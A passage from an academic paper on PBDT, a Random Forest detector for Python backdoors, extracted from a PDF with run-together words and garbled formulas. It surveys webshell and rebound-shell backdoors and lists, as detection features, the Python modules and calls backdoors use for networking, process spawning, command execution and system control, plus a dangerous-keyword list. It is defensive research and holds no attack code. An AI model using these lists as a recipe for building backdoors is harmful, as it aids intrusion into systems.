that implement the backdoor\\u2019s basic functions.\\nDetailed research on malicious python code behavior has\\nbecome a research point that needs to be broken.\\n'is paper uses machine learning method for Python\\nbackdoor detection by combining multiple features such as\\nfunction calls, text statistics, and opcodes. First, we analyze\\nthe modules and functions required for the basic functions\\nof Python backdoor, includingtext encryption, network\\ncommunication, process settings, \\ufb01le operations, command\\nexecution,and system control.'en,wecountthe numberof\\ntimes the suspicious module or function appears in the text\\nandrecordthesuspiciousfunction\\u2019scodeline.Whatismore,\\nthe entire text\\u2019s statistical characteristics, includinginfor-\\nmation entropy, longest string, coincidence index, andcom-\\npression rate, are obtained to capture the characteristics of\\nobfuscated codes. We also consider the number of IP, URL,\\nandmanydangerouskeywordsthat frequentlyappearin the\\nbackdoor. In addition, using the opcode information, the\\ncode is represented by the statistical features of the overall\\ntext and suspicious function lines, the TF-IDF feature\\nrepresenting the contextual relevance, and the FastText\\nfeature. Finally, it is sent to the Random Forest classi\\ufb01er to\\ndetermine whether it belongs to the backdoor. 'e main\\ncontributions of this paper are as follows:\\n(1) Inresponsetolackofdataset,wemanuallygenerated\\nsome Python backdoor samples, including rebound\\nshell and obfuscated code, to expand the sample\\nlibrary and improve the accuracy of classi\\ufb01er\\ndetection.\\n(2) By analyzing many real samples, the malicious\\nfunctionsandmodulesfrequentlyusedinthePython\\nbackdoor are summarized to distinguish the benign\\nandmalicioussample.Weintegratemultipletypesof\\nfeatures to classify malicious codes. Both statistical\\nfeatures and opcode features can eliminate the in-\\n\\ufb02uence of obfuscated codes and ignore irrelevant\\ninformation such as text comments. Simultaneously,\\nthen-gramvalueselectionfullyconsidersthePython\\nopcode\\u2019s characteristics and accurately represents\\nthe text information.\\n(3) We collect a total of 2,026 samples to test the pro-\\nposed model, including 1,511 benign Python codes\\nand 515 Python backdoor codes. In the end, all\\nindicators of PBDT reach more than 95%, and the\\naccuracy is as high as 97.7%.\\nTo verify the validity of PBDT, a series of comparative\\nexperiments are designed. 'e results show that, compared\\nwith other machine learning algorithms, Random Forest\\nhas better performance in the classi\\ufb01cation of Python\\nbackdoors,and the performanceof thecombinedfeature is\\nbetter than any single feature, which also has a more re-\\nmarkable performance improvement than the previous\\npaper method.\\n'e rest of this paper is organized as follows. Section 2\\nintroducestherelevantbackground,includingthede\\ufb01nition\\nand classi\\ufb01cation of backdoors and previous research work.\\nWe will describe the PBDTsystem architecture and speci\\ufb01c\\nimplementation methods in Section 3. Subsequently, in\\nSection 4, the dataset and the evaluation results of PBDTare\\nexplained and analyzed. Finally, Section 5 summarizes the\\nfull study.\\n2. Background\\n2.1. Backdoor. 'omas and Francillon [15] de\\ufb01nition of the\\nbackdoor is that the intentional structure existing in the\\nsystem undermines the original security of the system by\\nproviding convenient access to other privileged functions or\\ninformation. In other words, the backdoor refers to a\\nprogram method that bypasses security controls such as\\nauthentication to obtain system permissions, whose com-\\nmon types include webshell, C/S backdoor, thread insertion\\nbackdoor, and extended backdoor:\\n(1) Webshell refers to the backdoor program that exists\\ninthewebapplication.'e\\ufb01leformatincludesPHP,\\nASP, JSP, Python, and so on. After the attacker\\nexploits the vulnerability to invade the website, the\\nwebshell is placed in the server \\ufb01le directory for\\nsubsequent remote control, execution of malicious\\ncommands, and other operations.\\n(2) C/S backdoor uses a client/server model to achieve\\nthe control operation, some of which are similar to\\ntraditional Trojan programs\\u2019 principles. After the\\nattackerimplantstheserverintothetargetcomputer,\\nthe client starts the backdoor to control it. Rebound\\nshellisalsobased onthismode,but thetworolesare\\nprecisely the opposite. 'e attacker runs a server\\nprogram to monitor a speci\\ufb01c TCP/UDP port, and\\nthe victim host initiates a request for an active\\nconnection. 'is rebound connection is usually\\napplicable to scenarios such as restricted \\ufb01rewalls,\\noccupied ports, and insu\\ufb03cient permissions on the\\ncontrolled end.\\n(3) 'read insertion backdoor does not have an inde-\\npendent process when it runs but inserts into a\\nparticular service or thread of the system, which is\\nnow a mainstream type of backdoor. However, it is\\nrelatively di\\ufb03cult to detect or kill, and traditional\\n\\ufb01rewalls cannot e\\ufb00ectively defend against it.\\n(4) 'e extended backdoor usually concentrates a va-\\nriety of common functions, including system user\\ndetection, port opening, opening/stopping services,\\nHTTP access, and \\ufb01le upload/download. It has\\npowerful functions but relatively inadequate\\nconcealment.\\nPython has simple structures but powerful functions.\\nAttackers only need to write scripts\\u2019 dozens of lines to es-\\ntablish a persistent backdoor. And because Python is a\\ncommon language used by administrators, there is no no-\\nticeable di\\ufb00erence between malicious Python tra\\ufb03c and the\\n2 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ntra\\ufb03c generated by daily network management tools, so it is\\ndi\\ufb03cult to be detected by the terminal detection response\\nsystem, and it is quite popular with hackers. As a result, the\\ntraditional backdoor recognition method is not universal,\\nand it is particularly important to realize an e\\ufb00ective de-\\ntection of Python backdoor scripts.\\n2.2. Related Work. At present, there is little research on\\nPython malicious code in security \\ufb01eld. 'e papers on\\nbackdoor detection mainly focus on webshell. At the same\\ntime, JavaScript is also used as an interpretable language,\\nand part of the detection methods of malicious statements\\ncan be used in other language types. 'is section will in-\\ntroduce existing research on webshell and malicious\\nJavaScript from the perspective of static detection and\\ndynamic detection. Among them, the more typical papers\\nare summarized in Table 1.\\n2.2.1. Static Detection. Static detection mainly identi\\ufb01es\\nmalicious code by analyzing the grammatical structure and\\nstatisticalcharacteristicsofthesourcecode.'emostclassic\\nmethod is to build a black or white list and detect malicious\\n\\ufb01les through simple string\\u2019s regular matching. NeoPi [16] is\\na classic webshell open-source detection tool. It considers\\nthe document\\u2019s statistical characteristics to determine\\nwhether it is obfuscated and matched some feature function\\nfordetection.However,thefeaturedatabaseisrelativelyold.\\nTu et al. [20] detected webshells in applications based on\\nmalicious signatures and malicious functions. At the same\\ntime, it was proposed to consider only the longest word\\u2019s\\nbeginning and ending with the header tag. 'is method\\nreduced the false positives from NeoPi\\u2019s 24.5% to 6.7%, but\\nits detection essence was still simple character matching.\\nLawrence et al. [2] designed a \\ufb01rewall tool to intercept and\\nalert calls to system functions that were not in the whitelist.\\nHowever, due to the limited whitelist, there were high false\\npositives, and the webshell that was encrypted and obfus-\\ncated by complicated means could not be identi\\ufb01ed.\\nIt is impossible to obtain the function\\u2019s language envi-\\nronment only by manually de\\ufb01ned black and white lists,\\nwhich will cause many false positives. Besides, due to the\\ncontinuous variation of malicious code types, the rule base\\u2019s\\nupdateiscritical, and falsenegatives are inevitable.With the\\nwidespreadapplicationofmachinelearninginvarious\\ufb01elds,\\nit has also been used to detect malicious code, improving\\ndetection accuracy by combining with information such as\\ncode syntax and semantics. AL-Taharwa et al. [21] proposed\\nand implemented a JavaScript obfuscation detector JSOD,\\nwhich focused on obfuscated scripts. It \\ufb01rst performed anti-\\nobfuscation processing and extracted the contextual se-\\nmantic information of the code by using the AST (Abstract\\nSyntax Tree). 'en the malicious JavaScript was detected by\\nthe Bayesian classi\\ufb01er. Fass et al. [17] proposed a pre-de-\\ntection system JStap for malicious JavaScript. Based on\\nexistinglexicalandASTdetection,thesystemaddedthecode\\nCFG(ControlFlowGraph)andPDG(ProgramDependency\\nGraph), fully considering the syntax and semantic infor-\\nmation of the program. Finally, it was classi\\ufb01ed by Random\\nForest. While using machine learning, the e\\ufb00ect of basic\\nfunctions on the maliciousness of the code cannot be\\nignored.\\n'e most common language type in webshell is PHP.\\nOpcodesaretheinstructionsand\\ufb01eldsofthePHPoperation\\nperforming, which can eliminate interference from irrele-\\nvant items. In recent years, it has been often used in PHP\\nwebshell detection. Cui [18] designed a webshell detection\\nmodel, RF-GBDT, which considered the statistical charac-\\nteristics of PHP \\ufb01les. Furthermore, the model extracted the\\nTF-IDF vector and the hash vector of the opcode sequence.\\nAfter integrating all the features, the webshell was recog-\\nnized through Random Forest and gradient boosting deci-\\nsion tree. Fang et al. [22] proposed and implemented the\\nPHP webshell detection system FRF-WD. 'ey innovatively\\nusedtheFastTexttextclassi\\ufb01ertocharacterizePHP\\u2019sopcode\\nsequence, integrating its classi\\ufb01cation results and statistical\\nfeatures as the Random Forest classi\\ufb01er\\u2019s input. In addition\\nto the statistical and opcode features mentioned above, Pan\\netal.\\u2018s[23]detectionmethodofwebshellusedASTtoobtain\\nexecutable data features of PHP code, fully considering the\\nexecution data \\ufb02ow and function parameter characteristics\\nofcommonsystemcommands.'eopcodesequenceshould\\nbecombinedwiththebestn-gramvaluetoe\\ufb00ectivelyensure\\nthe detection e\\ufb00ect.\\nWith the rapid development and application [24, 25] of\\ndeepneuralnetworks,opcodesareoftencombinedtorealize\\nthe webshell detection function. Yong et al. [14] detected\\nPHP webshell based on DNN (deep neural network),\\nextracted opcode features through 2-gram and TF-IDF\\ngrammar models, and input them into a DNN model\\ncomposed of CNN (convolutional neural network), LSTM\\n(long short-term memory), and MLP (multilayer percep-\\ntron) for detection. But the model consumes a lot of\\ncomputing and storage resources. Word vector is a com-\\nmonlyusedrepresentationmethodintextclassi\\ufb01cation,and\\nit has also shown good detection advantages in malicious\\ncode detection in the recent years. Tian et al. [12] detected\\nwebshells with HTTP request packets, used Word2vec to\\nconvert the collected packet text into word vectors, and\\n\\ufb01nally implemented classi\\ufb01cation through the CNN model.\\nNdichu et al. [26] proposed a malicious JavaScript detection\\nscheme, which used the Doc2vec model to characterize the\\nsource code context\\u2019s features and input them into the SVM\\nclassi\\ufb01er to determine the program\\u2019s maliciousness.\\nInsummary,staticdetectioncanuselimitedresourcesto\\nachieve better detection results, but false negatives and false\\npositives are inevitable. How to improve detection accuracy\\nis a problem that needs to be focused on. 'e relevant re-\\nsearch introduced above is aimed at languages such as PHP\\nand JavaScript. Improving the existing methods to make\\nthem suitable for Python malicious code detection is a di-\\nrection worth studying.\\n2.2.2. Dynamic Detection. 'e main idea of dynamic de-\\ntection is to dynamically execute sample \\ufb01les, monitor\\nnetwork tra\\ufb03c, or call sensitive functions to identify mali-\\ncious code. 'is method is often used to analyze speci\\ufb01c\\nSecurity and Communication Networks 3\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nbehavior types of \\ufb01les, including extracting HTTP\\nrequesting or responding to payload characteristics, and\\nhooking sensitive functions.\\nKimetal.[27]designedaframeworkcalledJsSandboxto\\ndetect malicious JavaScript. 'rough IFH (internal function\\nhooking) monitoring and analysis of sample code behavior,\\nfunctions that could not be executed by API hooking could\\nbe extracted. 'is method was commonly used in other\\nmaliciouscode classi\\ufb01cationtasksand wouldnot bea\\ufb00ected\\nby operations such as code deformation and obfuscation on\\ndetection performance. Canali et al. [9] used honeypot\\ntechnology to obtain and analyze the attacker\\u2019s behavioral\\ncharacteristics\\u2019 destruction of the target. 'e information\\nsource included HTTP request logs and \\ufb01les modi\\ufb01ed or\\ngenerated after the attacker obtained the victim host\\u2019s\\npermission. It also focused on analyzing common webshell\\nbehaviors. Xie and Hu [10] developed an anomaly detection\\nsystemthatcanidentifywebshells.'eyanalyzedADFA-LD\\nintrusion detection datasets, obtained log behaviors, and\\nused the K-nearest neighbor (KNN) algorithm to cluster\\nthem.Althoughdynamicdetectioncane\\ufb00ectivelyreducethe\\nrate of false positive and false negative, it consumes more\\nresources and it is not suitable for detection tasks with\\nmultiple samples. At the same time, there may be a big gap\\nbetweentheactualapplicationandthedetectione\\ufb00ectinthe\\nideal experimental environment.\\n'erefore, studies have combined static and dynamic\\ndetection to achieve better classi\\ufb01cation results with limited\\nresources. Rieck et al. [28] proposed Cujo, a malicious\\nJavaScript automated detection system, which analyzed by\\ncombining static lexical features and dynamic runtime\\nfeatures. 'e dynamic analysis used sandbox to obtain web\\npagecode,providedanalysisreports,and\\ufb01nallymappedthe\\nreport results to vector space. 'e \\ufb01nal detection model was\\ngenerated based on SVM machine learning. Wang et al. [19]\\nresearched and implemented the JavaScript malware de-\\ntection tool JSDC. First, it used the extracted text, program\\ninformation, and dangerous function call features to detect\\nbased on machine learning. According to attack feature\\nvector and dynamic execution trajectory, malware was di-\\nvided into eight attack types. 'e dynamic and static\\ncombination achieved a false positive rate of 0.2123% and a\\nfalse negative rate of 0.8492%. Starov et al. [3] conducted an\\nin-depth analysis of common webshell behaviors based on\\ntwo dimensions of static analysis and dynamic analysis.\\n'roughstaticanalysis,itwasfoundthatmostofthesample\\nattacks included \\ufb01le browsing and uploading, system in-\\nformationviewing,commandexecution,etc.,whiledynamic\\nanalysisfoundthatmostofthemwouldtrytoaccesslinksor\\ndirectories such as http://\\u2217and /etc/\\u2217.\\nDynamic detection performs better in identifying\\nmalicious code behavior, but its inherent defects have high\\nrequirementsforresourceenvironmentandsamples,andits\\napplication in practice is limited. It is necessary to consider\\nvarious factors to select a suitable detection method\\ncomprehensively.\\n3. Methodology\\n'ePBDTmodelproposedinthispaperisconstructedbased\\non multiple features. Various features can be used for\\nclassi\\ufb01cation alone or in combination. Experimental data\\nwill be used to illustrate the performance of each combi-\\nnation in Section 4.3. 'e architectural designed is shown in\\nFigure 1. It has three categories, including sample module\\nandfunction call features,text statistical features,andopcode\\nfeatures.\\n'e calling feature involves six types of modules and\\nfunctions, including text encryption, network communica-\\ntion, process settings, \\ufb01le operations, command execution,and\\nsystem control,tocapturepotentiallydangerousbehaviorsof\\nthesample.However,thebackdoor\\ufb01lemaybeobfuscatedto\\navoid detection, so text statistical features are added to\\nidentify the obfuscated sample \\ufb01le through typical param-\\neters such asinformation entropy, longest string, coincidence\\nindex, and compression rate. At the same time, this part\\ninvolvestheIP,URL,anddangerouskeywordsthatarelikely\\nto exist in the backdoor. It is impossible to identify the\\nbackdoor based on the above-mentioned manually de\\ufb01ned\\nmalicious behaviors accurately. 'erefore, the opcode-re-\\nlated features are added, including the simple statistical\\nfeatures of the overall text and the suspicious function line,\\nthe TF-IDF feature indicating the importance of words, and\\nthe FastText feature of the e\\ufb03cient text classi\\ufb01er to com-\\nprehensively analyze the meaning of the opcode. Finally,\\nthese features are combined as the feature vector and input\\nT able1: Summary of related work.\\nAuthor Main work Shortcoming\\nStatic\\ndetection\\nScottandHagen\\n[16]\\nIdentifying obfuscated webshells through statistical\\nfeatures\\n'e feature library is old, and using simple\\ncharacter matching with high false positives\\nFass et al. [17] Extracting JavaScript semantic information through\\nAST, CFG, and PDG for malicious judgment\\nNo analysis and consideration of basic\\nfunctions with malicious intent\\nCui et al. [18] Using TF-IDF vectors and hash vectors to obtain\\nwebshell opcode features for detection\\nNo semantic information is considered,\\nwhich may result in false negative\\nYong et al. [14]\\nProcessing opcode through 2-gram and TF-IDF, and\\nusing composite neural network DNN for webshell\\u2019s\\nclassi\\ufb01cation\\nDeep neural network is too complex and\\nconsumes a lot of resources\\nDynamic\\ndetection\\nCanali and\\nBalzarotti [9]\\nAnalysis of common webshell behavior using honeypot\\ntechnology\\nHigh requirements for resources,\\nenvironment, and samples\\nWang et al. [19] Combining attack feature\\u2019s vectors and dynamic\\nexecution trajectories\\n'etypesofmalicious functionssummarized\\nare not comprehensive\\n4 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ninto the Random Forest classi\\ufb01er to classify Python samples\\nand accurately distinguish backdoor \\ufb01les with malicious\\nbehavior.\\nSome of the above features are proposed by previous\\nresearchers and some are proposed in this paper, which we\\nsummarize and illustrate in Table 2. For the old features, the\\nimprovements made in this paper are noted in the third\\ncolumn of the table. In the following, various features and\\nclassi\\ufb01er selection will be introduced in detail.\\n3.1. Call Features. It can be seen from the de\\ufb01nition of\\nbackdoor that the two key points worth noting are\\n\\u201cbypassing security controls\\u201d and \\u201cobtaining system per-\\nmissions.\\u201d 'erefore, there must be speci\\ufb01c modules and\\nfunctionstoimplementcorrespondingfunctions.Wecollect\\nand analyze numerous backdoor samples, combining with\\ndata summary and empirical analysis, and divide the\\nbackdoor\\u2019s common behaviors into the following six cate-\\ngories (Sections 3.3.1\\u20133.1.6). At the same time, we list the\\nmodules and functions required to implement each type of\\nfunction. See Table 3 for details.\\nMost of the function\\u2019s acquisition in the \\ufb01le directly\\nperforms regular matching on the text, such as[16]. 'e\\nshortcomings of this method are obvious. When the cor-\\nresponding function exists in the comment, it will be\\nregarded as called. But in fact, the function has not been\\nexecuted, andof course,there will beno maliciousbehavior.\\n'is paper analyzes the ASTof Python code, extracts the \\ufb01le\\nimport module and call function information, and obtains\\nthe number of various dangerous modules and functions\\nafter counting, as the call features part of the \\ufb01nal\\nclassi\\ufb01cation.\\nAST is a tree-like representation of the abstract gram-\\nmatical structure of a programming language. As the input\\nof the compiler\\u2019s back-end, it does not depend on speci\\ufb01c\\ngrammar and language details and represents information\\non the semantic level of code. Currently, AST has been\\nwidely used in the detection of malicious code\\n[17, 21, 29\\u201333]. 'is method can eliminate the in\\ufb02uence of\\nannotations on text analysis and e\\ufb00ectively extracts infor-\\nmationaboutimportedmodulesandcallingfunctions.Ifitis\\ndetermined to be a suspicious function, recording the\\nnumber of lines in the source \\ufb01le to obtain the line\\u2019s opcode\\ninformation (Section 3.3.1) and \\ufb01nally returns it as a result\\nfor in-depth study and analysis of suspicious \\ufb01le behavior.\\n3.1.1. Text Encryption.'e backdoor uses some obfuscation\\nmethods to bypass the security control and evade the\\nsoftware\\u2019s detection and killing of system. 'e most com-\\nmon one is to use algorithms to encrypt text. In order to\\nachieve this purpose, it is necessary to introduce corre-\\nsponding functional modules and call functions, including\\ncommonly used encryption algorithms \\u201cAES,\\u201d \\u201cRSA,\\u201d\\n\\u201cbase64,\\u201dencryptionpadding\\u201cpadding,\\u201d\\u201cOAEP,\\u201dencoding\\nconversion\\u201cbinascii,\\u201detc.,whichcanbeusedasdetermining\\na feature of the backdoor \\ufb01le.\\n3.1.2. Network Communication. A crucial function in the\\nbackdoor is data interaction, including the communication\\nbetween server and client in the C/S backdoor, and webshell\\nuploading or downloading \\ufb01les from a speci\\ufb01c network\\naddress. Python language implements such functions in-\\ncluding network communication \\u201csocket,\\u201d \\u201csetsockopt,\\u201d\\nSSH connection to remote server \\u201cparamiko,\\u201d \\u201cSSHClient,\\u201d\\nHTTP request \\u201curllib,\\u201d \\u201chttplib,\\u201d etc. If there is such be-\\nhavior, pay attention.\\n3.1.3. Process Setting. Generally, the process needs to be set\\nwhenthebackdoorisrunning,suchasstartinganewprocess\\nto facilitate subsequent operations, including creating a\\nprocess \\u201csubprocess,\\u201d multiprocess management \\u201cmulti-\\nprocessing,\\u201d and generating a pseudo-terminal \\u201cpty.\\u201d\\nConcurrently,toavoiddetectionandobtainpermissions,the\\nprocess may monitor \\u201cselect,\\u201d modify, and obtain the\\nData collection\\nGithub\\nMSF Veil\\nPython\\nBenign\\nBackdoor\\nTraining set\\nBenign\\nBackdoor\\nText processing\\nModule\\nFunction\\nRow\\nAST\\nOpcode\\nText\\nFeature extraction\\nCall features\\n Malicious module feature\\nMalicious function feature \\nLine opcode feature\\nText statistical features \\nInformation entropy\\nLongest string\\nCompression ratio\\nIP/URL\\nIC\\nKeywords\\nOpcode features\\n5-gram + TD-IDF feature\\nFastText malicious judgment\\nfeature\\nModel training and\\nclassi\\ufb01cation\\nRandom forest model\\nBenign Backdoor\\nTesting set\\nFeature set\\nCall features\\nText statistical features \\nOpcode features\\nAll opcode feature\\nTesting set\\nFigure 1: Architecture of PBDT.\\nSecurity and Communication Networks 5\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nprocess name \\u201csetproctitle\\u201d, etc. 'e introduction of above\\nmodule has reason to suspect that it has an attacking intent.\\n3.1.4. File Operation.'ebackdoorwillalsoperformaseries\\nof operations on \\ufb01les, including polluting local \\ufb01les, reading\\nand writing system sensitive \\ufb01les, and replacing common\\nsystem command \\ufb01les, in order to achieve the purpose of\\nobtaining system permissions. For example, memory read\\nand write \\u201cStringIO,\\u201d \\ufb01le copy \\u201cshutil,\\u201d \\ufb01le lock \\u201cfcntl,\\u201d and\\n\\u201cexec\\u201dfamilyfunctionsforexecuting\\ufb01les,including\\u201cexecl,\\u201d\\n\\u201cexecv,\\u201d and \\u201cexecvp.\\u201d Although the above modules and\\nfunctions are harmless by themselves, they may cause un-\\ndesirable consequences when used by the backdoor.\\n3.1.5. Command Execution. Executing system commands is\\na common and potentially harmful behavior of backdoors\\nand may be a pivotal step in achieving core functions.\\nSpeci\\ufb01cally, it includes the functions \\u201csystem,\\u201d \\u201ccommand,\\u201d\\n\\u201cexec_command,\\u201detc., that execute commands. In addition,\\ninteractingwiththecommandlineandparsingparametersis\\nalso a signi\\ufb01cant feature, such as modules \\u201cargparse,\\u201d\\n\\u201cgetopt,\\u201d \\u201cargv,\\u201d etc. But normal Python programs may also\\nhave such requirements, so the correct distinction is\\nnecessary.\\n3.1.6. System Control. Controlling the system and\\nobtaining system-related information is the ultimate goal\\nof backdoor execution and an essential manifestation of\\nbackdoor hazards. Such functions include system moni-\\ntoring \\u201cpsutil,\\u201d system hardware\\u2019s informationacquisition\\n\\u201cwmi,\\u201d system operation \\u201cplatform,\\u201d etc. Besides, registry\\noperations \\u201cwinreg\\u201d and virtual memory allocation\\n\\u201cVirtualAlloc\\u201d are also common behaviors. 'is part also\\nincludes some special functions, such as the module\\n\\u201cpynput\\u201dthatcontrolsthekeyboardandmouse.'eabove\\ncan be used as a vital basis for judging whether it is a\\nbackdoor.\\n3.2. Text Statistical Features.'e matching of modules and\\nfunctionscansimplyandintuitivelyidentifysomemalicious\\nbehaviors of the backdoor. However, in actual applications,\\nin order to bypass the security control, the backdoor \\ufb01le is\\nlikely to undergo obfuscation, such as the splicing or\\nencoding of characters, and simple function matching\\ncannotachievethedetectione\\ufb00ect.'eobfuscatedcode text\\nhassometypicalfeatures.Here,fourtypesareselectedasthe\\n\\ufb01nal feature components, and two additional features are\\nadded simultaneously.\\n3.2.1. Information Entropy. 'e concept of information\\nentropy was \\ufb01rst proposed by Shannon [34] in 1948. It\\nrepresentstheprobabilityofrandomdiscreteeventsandis\\na measure of the system order\\u2019s degree. 'e more chaotic\\nthe information, the higher the corresponding entropy.\\n'e method of calculating information entropy is as\\nfollows:\\nT able3: List of common modules and functions of backdoor.\\nModule Function\\nText encryption AES/base64/binascii/hashlib/RSA/\\nCrypto/sha256/hashes/padding/DES\\nb64encode/b64decode/encrypt/decrypt/EncodeAES/DecodeAES/\\nAESGCM/md5/rc4/SHA256/sha1/encode_base64/OAEP/MGF1\\nNetwork\\ncommunication\\nSocket/urllib2/urllib/paramiko/ftplib/\\nSocketServer/httplib Socket/bind/setsockopt/gethostbyname/gethostname/SSHClient\\nProcess setting Subprocess/commands/pty/threading/\\nselect/multiprocessing/setproctitle\\nspawn/Popen/communicate/daemon/fork/'readingTCPServer/\\n'readingUDPServer/setproctitle/Create'read\\nFile operation Shutil/fcntl/StringIO/BytesIO/ctypes/\\nscapy.all Exec/execv/execvp/exec\\ufb01le/storbinary\\nCommand\\nexecution\\nArgparse/getopt/getpass/argv/optparse/\\ncmd\\nSystem/getopt/getoutput/tcsetattr/command/exec_command/\\ncheck_output\\nSystem control Platform/winreg/psutil/wmi/pynput VirtualAlloc/sysinfo\\nT able2: Feature summary.\\nFeature set Old features New features and improvements\\nCall features Malicious module feature\\nMalicious function feature\\nLine opcode feature\\nText statistical features Information entropy\\n'e longest string\\nIndex of coincidence\\nCompression ratio\\nIP/URL information\\nDangerous keywords\\nOpcode features All opcode features\\nTF-IDF feature 5-gram\\nFastText feature 5-gram\\n6 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nH(x) \\ufffd \\u2212 \\udbff\\udf58\\nn\\ni\\ufffd1\\np xi\\u0000 \\udbff\\udf01 log p xi\\u0000 \\udbff\\udf01 \\u0000 \\udbff\\udf01. (1)\\nAmong them, p(xi) represents the probability of a\\nrandom eventxi. When the backdoor performs \\ufb01le obfus-\\ncation to hide its existence, encryption and encoding will\\ngenerate some random strings, making the information\\nentropy higher. 'erefore, the greater the information en-\\ntropy, the more suspicious the corresponding \\ufb01le.\\n3.2.2. 1e Longest String. When the code is obfuscated and\\nencoded,itwillgeneratealongstringwithoutspaces,suchas\\nthe classic base64 encoding. Moreover, the introduction of\\nshellcodewillhavethesamee\\ufb00ect,whichisnoteasytodetect\\nbecauseofthemaliciousbehaviorhiddeninthehexadecimal\\nmachine code. 'is kind of long string is rarely encountered\\nin regular Python code, so the length of the longest string in\\nthe code can be used to determine the backdoor.\\n3.2.3. Index of Coincidence. Index of coincidence represents\\nthe relative frequency of the letters in sample, that is, the\\nprobability that two letters are the same. 'e concept is\\nwidely used in cryptography related research. 'e calcula-\\ntion method is as follows:\\nIC \\ufffd \\udbff\\udf50c\\ni\\ufffd1 ni ni \\u2212 1\\u0000 \\udbff\\udf01\\nN((N \\u2212 1)/c). (2)\\nC isthenormalizationcoe\\ufb03cient,whichis26forEnglish\\nletters, ni is the number of times each letter appears in the\\ntext, andN represents its length. Since the encrypted text\\u2019s\\nrandomness will increase, the code has a high probability of\\nbeing a backdoor \\ufb01le after obfuscation operations such as\\nencryption and encoding if the IC value is low.\\n3.2.4. Compression Ratio. In information theory, data\\ncompression is a process of representing information with\\nfewer data bits than the source \\ufb01le according to a speci\\ufb01c\\nencoding mechanism, which can make the distribution of\\ndata characters tend to be balanced. 'e ratio of after\\ncompressing to before compressing of a \\ufb01le\\u2019s size is called\\nthe compression ratio. In order to achieve the purpose of\\nobfuscation, malicious \\ufb01les generally have a relatively uni-\\nform character\\u2019s distribution after particular encoding, and\\nthe data compression rate is higher than that of ordinary\\n\\ufb01les.Itisreasonabletothinkthat\\ufb01leswithhighcompression\\nrate are backdoors.\\n3.2.5. IP/URL Information. When the backdoor performs\\nnetwork communication, IP or URL is most likely required\\nto indicate the target address, which usually appears in pairs\\nwith data interaction related functions. For example, \\u201cbind\\u201d\\nbinds the IP and port, \\u201chost\\u201d parameter indicates the\\ncommunication host, and \\u201cconnect\\u201d connects to the IP\\naddressandalsoincludesinteractionwithaspeci\\ufb01cnetwork\\naddress URL. 'erefore, the total number of IPs or URLs in\\nthe code can be used as a feature of the backdoor.\\n3.2.6. Dangerous Keywords. When developers write back-\\ndoor code, due to their habits or functional needs, they will\\ninclude some backdoor-related words in comments or\\nnamed functions. 'e characters considered here include\\n\\u201cshellcode,\\u201d \\u201cwebshell,\\u201d \\u201cshell,\\u201d \\u201cbackdoor,\\u201d \\u201ccmd,\\u201d \\u201ccom-\\nmand,\\u201d \\u201chack,\\u201d and \\u201cbypass.\\u201d If there are more dangerous\\nkeywords in the code, it is considered as a suspicious\\nbackdoor \\ufb01le.\\n3.3. Opcode Features. 'e two modules mentioned above\\ncan only identify known malicious behaviors or encoded\\nspecial \\ufb01les. However, there are various types of backdoors\\nin actual applications. People have limited awareness of\\nmalicious codes, and not all malicious \\ufb01les will be encoded.\\n'e text\\u2019s characteristics of some encoded \\ufb01les are not\\nprominent. 'erefore, we consider adding opcode features\\nto express Python code through the nature of instructions\\nandcontextualconnectionsrepresentedbytheopcodeitself.\\nOpcodes represent instructions or \\ufb01elds for performing\\noperationsinacomputerprogram.Itisastepincompilation\\nprocess of Python \\ufb01les. Compared with the source code, it\\ncan eliminate the in\\ufb02uence of \\ufb01le obfuscated and ignore the\\ninterference items such as source comments. 'ere are 121\\nopcodes listed in the latest Python3.8 document. 'is paper\\nobtains the sample\\u2019s opcode sequence and extracts the\\ncorresponding features through the following three types of\\nprocessing.\\n3.3.1. Statistical Features. 'e functions and processing\\nmethods of backdoor \\ufb01les are di\\ufb00erent from benign \\ufb01les, so\\nthe types and numbers of opcodes used may be di\\ufb00erent.\\nFirst, we conduct statistics on each opcode instruction for\\nthe entire text and generate an array with a length of 121 as\\nthe overall opcode statistical feature.\\n'e primary manifestation of the malicious function\\nperformed by the backdoor is malicious functions. If there\\naresuspiciousfunctionsinthebenign\\ufb01le,theopcodesofthe\\ntwo contexts\\u2019 execution parameters may be di\\ufb00erent.\\n'erefore, the backdoor \\ufb01le can be identi\\ufb01ed by the opcode\\ncharacteristics of the suspicious function line. Use the lines\\u2019\\nnumberofthecode\\ufb01le\\u2019sdangerousfunctionwhenobtaining\\nfunction information through AST. 'en, compile all code\\nlines containing dangerous functions into opcodes sepa-\\nrately, and count the total number of various opcodes.\\nSimilarly,anarrayoflength121isgeneratedasthestatistical\\nfeature of the malicious function line\\u2019s opcode.\\n3.3.2. TF-IDF Feature. TF-IDF (term frequency-inverse\\ndocument frequency) is a commonly used weighting tech-\\nnique to evaluate the word\\u2019s importance to the entire text\\n[35]. TF represents the frequency of target word in the text.\\nIDF decreases as the number of texts containing a certain\\nphrase increases. It is used to reduce the impact of some\\ncommon phrases in all texts that have little e\\ufb00ect on the\\nfunction. 'e two are multiplied to the \\ufb01nal TF-IDF 